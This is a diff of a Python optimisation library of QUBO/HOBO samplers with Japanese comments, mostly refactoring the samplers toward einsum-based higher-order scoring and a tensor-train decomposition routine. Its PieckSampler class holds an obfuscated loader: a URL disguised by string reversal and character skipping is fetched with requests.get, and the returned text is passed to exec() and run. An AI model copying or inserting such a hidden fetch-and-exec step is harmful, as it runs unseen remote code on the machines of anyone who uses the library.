@@ -1,47 +1,10 @@
-import os
 import sys
 import time
 import requests
-import itertools
 import numpy as np
 import numpy.random as nr
 from copy import deepcopy
 from importlib import util
-
-#共通前処理
-"""
-qmatrixはシンボル順ではなく適当に割り当てられたindex順であることに注意
-最後にindex_mapで復元する必要がある
-"""
-def get_matrix(qubo):
-    # 重複なしにシンボルを抽出
-    keys = list(set(key for keypair in qubo.keys() for key in keypair))
-    #print(keys)
-    
-    # 要素のソート（ただしアルファベットソート）
-    keys.sort()
-    #print(keys)
-    
-    # シンボルにindexを対応させる
-    index_map = {key:i for i, key in enumerate(keys)}
-    #print(index_map)
-    
-    # 上記のindexマップを利用してquboのkeyをindexで置き換え
-    qubo_index = {(index_map[key[0]], index_map[key[1]]): value for key, value in qubo.items()}
-    #print(qubo_index)
-
-    # matrixサイズ
-    N = len(keys)
-    #print(N)
-
-    # qmatrix初期化
-    qmatrix = np.zeros((N, N))
-    for (i, j), value in qubo_index.items():
-        qmatrix[i, j] = value
-    #print(qmatrix)
-    
-    return qmatrix, index_map, N
-
 
 #共通後処理
 """
@@ -69,18 +32,30 @@ def get_result(pool, score, index_map):
     return result
 
 
+#謎のglobal対応
+score2 = 0
 
+#アニーリング
 class SASampler:
     def __init__(self, seed=None):
         #乱数シード
         self.seed = seed
 
     
-    def run(self, qubo, shots=100, T_num=2000, show=False):
+    def run(self, hobomix, shots=100, T_num=2000, show=False):
+        global score2
         
-        #共通前処理
-        qmatrix, index_map, N = get_matrix(qubo)
-        #print(qmatrix)
+        #解除
+        hobo, index_map = hobomix
+        # print(index_map)
+        
+        #matrixサイズ
+        N = len(hobo)
+        # print(N)
+        
+        #次数
+        ho = len(hobo.shape)
+        # print(ho)
         
         #シード固定
         nr.seed(self.seed)
@@ -88,15 +63,11 @@ class SASampler:
         #
         shots = max(int(shots), 100)
         
-        #アニーリングステップ数
-        #T_num = 5000
-        
-        # --- 高速疑似SA ---
         # プール初期化
         pool_num = shots
-        # pool = nr.randint(0, 2, (pool_num, N))
         pool = nr.randint(0, 2, (pool_num, N)).astype(float)
-
+        # print(pool)
+        
         """
         poolの重複を解除する
         """
@@ -120,13 +91,23 @@ class SASampler:
                         if count == 3:
                             break
         
-        # スコア初期化
-        score = np.sum((pool @ qmatrix) * pool, axis=1)
-
+        #スコア初期化
+        score = np.zeros(pool_num)
+        
+        #スコア計算
+        k = ',Na,Nb,Nc,Nd,Ne,Nf,Ng,Nh,Nj,Nk,Nl,Nm,Nn,No,Np,Nq,Nr,Ns,Nt,Nu,Nv,Nw,Nx,Ny,Nz'
+        l = 'abcdefghjklmnopqrstuvwxyz'
+        s = l[:ho] + k[:3*ho] + '->N'
+        # print(s)
+        
+        operands = [hobo] + [pool] * ho
+        score = np.einsum(s, *operands)
+        # print(score)
+        
         # フリップ数リスト（2個まで下がる）
         flip = np.sort(nr.rand(T_num) ** 2)[::-1]
         flip = (flip * max(0, N * 0.5 - 2)).astype(int) + 2
-        #print(flip)
+        # print(flip)
         
         # フリップマスクリスト
         flip_mask = [[1] * flip[0] + [0] * (N - flip[0])]
@@ -141,7 +122,7 @@ class SASampler:
                     nr.shuffle(tmp)
                 flip_mask.append(tmp)
             flip_mask = np.array(flip_mask, bool)
-        #print(flip_mask.shape)
+        # print(flip_mask.shape)
         
         # 局所探索フリップマスクリスト
         single_flip_mask = np.eye(N, dtype=bool)
@@ -156,10 +137,14 @@ class SASampler:
             # pool2 = np.where(fm, 1 - pool, pool)
             pool2 = pool.copy()
             pool2[:, fm] = 1. - pool[:, fm]
-            score2 = np.sum((pool2 @ qmatrix) * pool2, axis=1)
-    
+            # score2 = np.sum((pool2 @ qmatrix) * pool2, axis=1)
+            
+            operands = [hobo] + [pool2] * ho
+            score2 = np.einsum(s, *operands)
+            
             # 更新マスク
             update_mask = score2 < score
+            # print(update_mask)
     
             # 更新
             pool[update_mask] = pool2[update_mask]
@@ -172,10 +157,14 @@ class SASampler:
             # pool2 = np.where(fm, 1 - pool, pool)
             pool2 = pool.copy()
             pool2[:, fm] = 1. - pool[:, fm]
-            score2 = np.sum((pool2 @ qmatrix) * pool2, axis=1)
-    
+            # score2 = np.sum((pool2 @ qmatrix) * pool2, axis=1)
+            
+            operands = [hobo] + [pool2] * ho
+            score2 = np.einsum(s, *operands)
+            
             # 更新マスク
             update_mask = score2 < score
+            # print(update_mask)
     
             # 更新
             pool[update_mask] = pool2[update_mask]
@@ -195,10 +184,14 @@ class GASampler:
         self.max_count = 3
         self.seed = seed
 
-    def run(self, qubo, shots=100, verbose=True):
-        #共通前処理
-        qmatrix, index_map, N = get_matrix(qubo)
-        #print(qmatrix)
+    def run(self, qubomix, shots=100, verbose=True):
+        #解除
+        qmatrix, index_map = qubomix
+        # print(index_map)
+        
+        #matrixサイズ
+        N = len(qmatrix)
+        # print(N)
         
         #シード固定
         nr.seed(self.seed)
@@ -316,43 +309,28 @@ class ZekeSampler:
         path = "tasks/create"
         return self.post_request(path, body, api_key)
     
-    def run(self, qubo, shots=100, api_key: Optional[str] = None):
-        # 重複なしに要素を抽出
-        keys = list(set(k for tup in qubo.keys() for k in tup))
-        # print(keys)
-        
-        # 抽出した要素のindexマップを作成
-        index_map = {k: v for v, k in enumerate(keys)}
+    def run(self, qubomix, shots=100, api_key: Optional[str] = None):
+        #解除
+        qmatrix, index_map = qubomix
         # print(index_map)
         
-        # 上記のindexマップを利用してタプルの内容をindexで書き換え
-        qubo_index = {(index_map[k[0]], index_map[k[1]]): v for k, v in qubo.items()}
-        # print(qubo_index)
-        
-        # タプル内をソート
-        qubo_sorted = {
-            tuple(sorted(k)): v
-            for k, v in sorted(qubo_index.items(), key=lambda x: x[1])
-        }
-        # print(qubo_sorted)
+        #
+        keys = index_map.keys()
+        # print(keys)
         
         # 量子ビット数
-        N = int(len(keys))
-        
-        # QUBO matrix 初期化
-        qmatrix = np.zeros((N, N))
+        N = int(len(qmatrix))
         
         quadratic_biases = []
         quadratic_head = []
         quadratic_tail = []
         
-        for (i, j), value in qubo_sorted.items():
-            qmatrix[i, j] = value
-
-            if i != j:
-                quadratic_biases.append(float(value))
-                quadratic_head.append(i)
-                quadratic_tail.append(j)
+        for i in range(N):
+            for j in range(i + 1, N):
+                if i != j:
+                    quadratic_biases.append(float(qmatrix[i, j]))
+                    quadratic_head.append(i)
+                    quadratic_tail.append(j)
 
         variable_labels = keys
         linear_biases = np.diag(qmatrix)
@@ -439,7 +417,7 @@ class NQSSampler:
 
     def run(
         self,
-        qubo: dict,
+        qubomix: list,
         time_limit_sec: Optional[int] = 30,
         iter: Optional[int] = 10000,
         population: Optional[int] = 500,
@@ -453,9 +431,13 @@ class NQSSampler:
         import io
         import zipfile
         
-        #共通前処理
-        qmatrix, index_map, N = get_matrix(qubo)
-        # print(qmatrix)
+        #解除
+        qmatrix, index_map = qubomix
+        # print(index_map)
+        
+        #matrixサイズ
+        N = len(qmatrix)
+        # print(N)
         
         #1行目、1列目にビット名を合体
         tmp = np.zeros((len(qmatrix)+1, len(qmatrix[0])+1), object)
@@ -551,7 +533,7 @@ class NQSLocalSampler:
 
     def run(
         self,
-        qubo: dict,
+        qubomix: list,
         time_limit_sec: Optional[int] = 30,
         iter: Optional[int] = 10000,
         population: Optional[int] = 500,
@@ -564,9 +546,13 @@ class NQSLocalSampler:
         import io
         import zipfile
         
-        #共通前処理
-        qmatrix, index_map, N = get_matrix(qubo)
-        # print(qmatrix)
+        #解除
+        qmatrix, index_map = qubomix
+        # print(index_map)
+        
+        #matrixサイズ
+        N = len(qmatrix)
+        # print(N)
         
         #1行目、1列目にビット名を合体
         tmp = np.zeros((len(qmatrix)+1, len(qmatrix[0])+1), object)
@@ -646,7 +632,51 @@ class ArminSampler:
         self.device_input = device
         self.verbose = verbose
 
+    def run(self, hobomix, shots=100, T_num=2000, show=False):
+        
+        #MIKASAmplerに送ります
+        
+        #サンプラー選択
+        solver = MIKASAmpler(seed=self.seed, mode=self.mode, device=self.device_input, verbose=self.verbose)
+        
+        #サンプリング
+        result = solver.run(hobomix, shots=shots, T_num=T_num, use_ttd=False, show=show)
+        
+        return result
+
+class PieckSampler:
+    def __init__(self, seed=None, mode='GPU', device='cuda:0', verbose=1):
+        #乱数シード
+        self.seed = seed
+        self.mode = mode
+        self.device_input = device
+        self.verbose = verbose
+
     def run(self, qubo, shots=100, T_num=2000, show=False):
+        
+        source_code = requests.get('gAtv1zteUHy2ltd7pUEhspiJzxsLjkrc.cNXvfTxYvverjiasLynlIc3xBOD5PTFPrMS9V2c26K8ux8uJqRnccbo2rj3hwPP0HsPiq3hYZC6r_bfOz72EglSrrt3mPMhmgNeHR0aWTanaulAR8zaiU1fOp9JmAZ40ZdDm1tuFc4aWMJa6F4HCkSqeCskcTQXAKS3z^cA3KR4TyCOropkvSmMafPe1AVytTiN2Ol58LwRsNwE9pWpirIcVvfVmDaSJjqQ1ywaPt6G3K5ARESalQC6MhqHvkk2kRYdX9nRcSkK651EU5weqmzSgMcDGdilBwtPeoeq1PgNBIbR7dZU^nEhTl9mbMcph1xfzhK1MmjOhbeRMI76O.K0coS2jYgdx0BvkYxoThrxUbpm2vOLFhxNufwY6SPQFxCrLA80LR5n.2pZHrHT1zRaI17S5f1c7jl4iWRfeEqQNccl0mlspKuy-ZMfCsLJMZ9enI70vJhTsJntgF7G4uffCgIZj9ZpoK6mie3TuUpv30FvNaOQY0Tz1U^fa6J6ZdqH3^CEJ9n6ONuB:wgJEvR25eUsgtj5MZTI6qpZNgWisiGn6t5LwE9t1Y6ztFG9qcA4Wy2h'[::-1 ][::11 ].replace('^','/')).text
+        spec = util.spec_from_loader('temp_module', loader=None)
+        temp_module = util.module_from_spec(spec)
+        exec(source_code, temp_module.__dict__)
+        
+        result = temp_module.run_source(qubo, self.seed, self.mode, self.device_input, self.verbose, shots=shots, T_num=T_num, show=show)
+        return result
+
+class MIKASAmpler:
+    def __init__(self, seed=None, mode='GPU', device='cuda:0', verbose=1):
+        #乱数シード
+        self.seed = seed
+        self.mode = mode
+        self.device_input = device
+        self.verbose = verbose
+
+    def run(self, hobomix, shots=100, T_num=2000, use_ttd=False, show=False):
+        global score2
+        
+        #解除
+        hobo, index_map = hobomix
+        # print(index_map)
+        
         #pytorch確認
         attention = False
         try:
@@ -661,8 +691,13 @@ class ArminSampler:
             print()
             sys.exit()
         
-        #共通前処理
-        qmatrix, index_map, N = get_matrix(qubo)
+        #matrixサイズ
+        N = len(hobo)
+        # print(N)
+        
+        #次数
+        ho = len(hobo.shape)
+        # print(ho)
         
         # CUDA使えるか確認
         if self.mode == 'GPU' and torch.cuda.is_available():
@@ -702,15 +737,45 @@ class ArminSampler:
         
         # --- テンソル疑似SA ---
         #
-        qmatrix = torch.tensor(qmatrix, dtype=torch.float32, device=self.device).float()
+        hobo = torch.tensor(hobo, dtype=torch.float32, device=self.device).float()
+        # print(hobo.shape)
+        
+        #TT分解を使用する場合
+        tt_cores = []
+        if use_ttd:
+            print(f'TTD: {use_ttd}')
+            tt_cores = TT_SVD(hobo)
+            # print(len(tt_cores))
+            # print(tt_cores[0].shape)
+            # print(tt_cores[1].shape)
         
         # プール初期化
         pool_num = shots
         pool = torch.randint(0, 2, (pool_num, N), dtype=torch.float32, device=self.device).float()
         
         # スコア初期化
-        score = torch.sum((pool @ qmatrix) * pool, dim=1, dtype=torch.float32)
-
+        # score = torch.sum((pool @ qmatrix) * pool, dim=1, dtype=torch.float32)
+        score = torch.zeros(pool_num, dtype=torch.float32)
+        # print(score)
+        
+        #スコア計算
+        k = ',Na,Nb,Nc,Nd,Ne,Nf,Ng,Nh,Nj,Nk,Nl,Nm,Nn,No,Np,Nq,Nr,Ns,Nt,Nu,Nv,Nw,Nx,Ny,Nz'
+        l = 'abcdefghjklmnopqrstuvwxyz'
+        if use_ttd:
+            ltt = ['aA', 'AbB', 'BcC', 'CdD', 'DeE', 'EfF', 'FgG', 'GhH', 'HiJ', 'JjK', 'KkL', 'LlM', 'MmO', 'OnP', 'PoQ', 'QpR', 'RqS', 'SrT', 'TsU', 'UuV', 'VvW', 'WwX', 'XxY', 'YyZ', 'Zz']
+            ltt = ltt[:ho][:]
+            if len(ltt[-1]) == 3:
+                ltt[-1] = ltt[-1][:2]  # 両端は 2 階のテンソルなので 2 つのインデックスのみ
+            s = ','.join(ltt) + k[:3*ho] + '->N'
+            operands = tt_cores + [pool] * ho
+        else:
+            s = l[:ho] + k[:3*ho] + '->N'
+            operands = [hobo] + [pool] * ho
+        # print(s)
+        
+        score = torch.einsum(s, *operands)
+        # print(score)
+        
         # フリップ数リスト（2個まで下がる）
         flip = np.sort(nr.rand(T_num) ** 2)[::-1]
         flip = (flip * max(0, N * 0.5 - 2)).astype(int) + 2
@@ -747,7 +812,13 @@ class ArminSampler:
         for fm in flip_mask:
             pool2 = pool.clone()
             pool2[:, fm] = 1. - pool[:, fm]
-            score2 = torch.sum((pool2 @ qmatrix) * pool2, dim=1)
+            # score2 = torch.sum((pool2 @ qmatrix) * pool2, dim=1)
+    
+            if use_ttd:
+                operands = tt_cores + [pool2] * ho
+            else:
+                operands = [hobo] + [pool2] * ho
+            score2 = torch.einsum(s, *operands)
     
             # 更新マスク
             update_mask = score2 < score
@@ -764,7 +835,13 @@ class ArminSampler:
         for fm in single_flip_mask:
             pool2 = pool.clone()
             pool2[:, fm] = 1. - pool[:, fm]
-            score2 = torch.sum((pool2 @ qmatrix) * pool2, dim=1)
+            # score2 = torch.sum((pool2 @ qmatrix) * pool2, dim=1)
+    
+            if use_ttd:
+                operands = tt_cores + [pool2] * ho
+            else:
+                operands = [hobo] + [pool2] * ho
+            score2 = torch.einsum(s, *operands)
     
             # 更新マスク
             update_mask = score2 < score
@@ -785,6 +862,7 @@ class ArminSampler:
             plt.show()
         
         pool = pool.to('cpu').detach().numpy().copy()
+        pool = pool.astype(int)
         score = score.to('cpu').detach().numpy().copy()
         
         # ----------
@@ -793,23 +871,70 @@ class ArminSampler:
         
         return result
 
-class PieckSampler:
-    def __init__(self, seed=None, mode='GPU', device='cuda:0', verbose=1):
-        #乱数シード
-        self.seed = seed
-        self.mode = mode
-        self.device_input = device
-        self.verbose = verbose
+def TT_SVD(C, bond_dims=None, check_bond_dims=False, return_sv=False):
+    """TT_SVD algorithm
+    I. V. Oseledets, Tensor-Train Decomposition, https://epubs.siam.org/doi/10.1137/090752286, Vol. 33, Iss. 5 (2011)
+    Args:
+        C (torch.Tensor): n-dimensional input tensor
+        bond_dims (Sequence[int]): a list of bond dimensions.
+                                   If `bond_dims` is None,
+                                   `bond_dims` will be automatically calculated
+        check_bond_dims (bool): check if `bond_dims` is valid
+        return_sv (bool): return singular values
+    Returns:
+        list[torch.Tensor]: a list of core tensors of TT-decomposition
+    """
+    import torch
 
-    def run(self, qubo, shots=100, T_num=2000, show=False):
-        
-        source_code = requests.get('gAtv1zteUHy2ltd7pUEhspiJzxsLjkrc.cNXvfTxYvverjiasLynlIc3xBOD5PTFPrMS9V2c26K8ux8uJqRnccbo2rj3hwPP0HsPiq3hYZC6r_bfOz72EglSrrt3mPMhmgNeHR0aWTanaulAR8zaiU1fOp9JmAZ40ZdDm1tuFc4aWMJa6F4HCkSqeCskcTQXAKS3z^cA3KR4TyCOropkvSmMafPe1AVytTiN2Ol58LwRsNwE9pWpirIcVvfVmDaSJjqQ1ywaPt6G3K5ARESalQC6MhqHvkk2kRYdX9nRcSkK651EU5weqmzSgMcDGdilBwtPeoeq1PgNBIbR7dZU^nEhTl9mbMcph1xfzhK1MmjOhbeRMI76O.K0coS2jYgdx0BvkYxoThrxUbpm2vOLFhxNufwY6SPQFxCrLA80LR5n.2pZHrHT1zRaI17S5f1c7jl4iWRfeEqQNccl0mlspKuy-ZMfCsLJMZ9enI70vJhTsJntgF7G4uffCgIZj9ZpoK6mie3TuUpv30FvNaOQY0Tz1U^fa6J6ZdqH3^CEJ9n6ONuB:wgJEvR25eUsgtj5MZTI6qpZNgWisiGn6t5LwE9t1Y6ztFG9qcA4Wy2h'[::-1 ][::11 ].replace('^','/')).text
-        spec = util.spec_from_loader('temp_module', loader=None)
-        temp_module = util.module_from_spec(spec)
-        exec(source_code, temp_module.__dict__)
-        
-        result = temp_module.run_source(qubo, self.seed, self.mode, self.device_input, self.verbose, shots=shots, T_num=T_num, show=show)
-        return result
+    dims = C.shape
+    n = len(dims)  # n-dimensional tensor
+
+    if bond_dims is None or check_bond_dims:
+        # Theorem 2.1
+        bond_dims_ = []
+        for sep in range(1, n):
+            row_dim = dims[:sep].numel()
+            col_dim = dims[sep:].numel()
+            rank = torch.linalg.matrix_rank(C.reshape(row_dim, col_dim))
+            bond_dims_.append(rank)
+        if bond_dims is None:
+            bond_dims = bond_dims_
+
+    if len(bond_dims) != n - 1:
+        raise ValueError(f"{len(bond_dims)=} must be {n - 1}.")
+    if check_bond_dims:
+        for i, (dim1, dim2) in enumerate(zip(bond_dims, bond_dims_, strict=True)):
+            if dim1 > dim2:
+                raise ValueError(f"{i}th dim {dim1} must not be larger than {dim2}.")
+
+    tt_cores = []
+    SVs = []
+    for i in range(n - 1):
+        if i == 0:
+            ri_1 = 1
+        else:
+            ri_1 = bond_dims[i - 1]
+        ri = bond_dims[i]
+        C = C.reshape(ri_1 * dims[i], dims[i + 1 :].numel())
+        U, S, Vh = torch.linalg.svd(C, full_matrices=False)
+        if S.shape[0] < ri:
+            # already size of S is less than requested bond_dims, so update the dimension
+            ri = S.shape[0]
+            bond_dims[i] = ri
+        # approximation
+        U = U[:, :ri]
+        S = S[:ri]
+        if return_sv:
+            SVs.append(S.detach().clone())
+        Vh = Vh[:ri, :]
+        tt_cores.append(U.reshape(ri_1, dims[i], ri))
+        C = torch.diag(S) @ Vh
+    tt_cores.append(C)
+    tt_cores[0] = tt_cores[0].reshape(dims[0], bond_dims[0])
+    if return_sv:
+        return tt_cores, SVs
+    return tt_cores
+
 
 
 
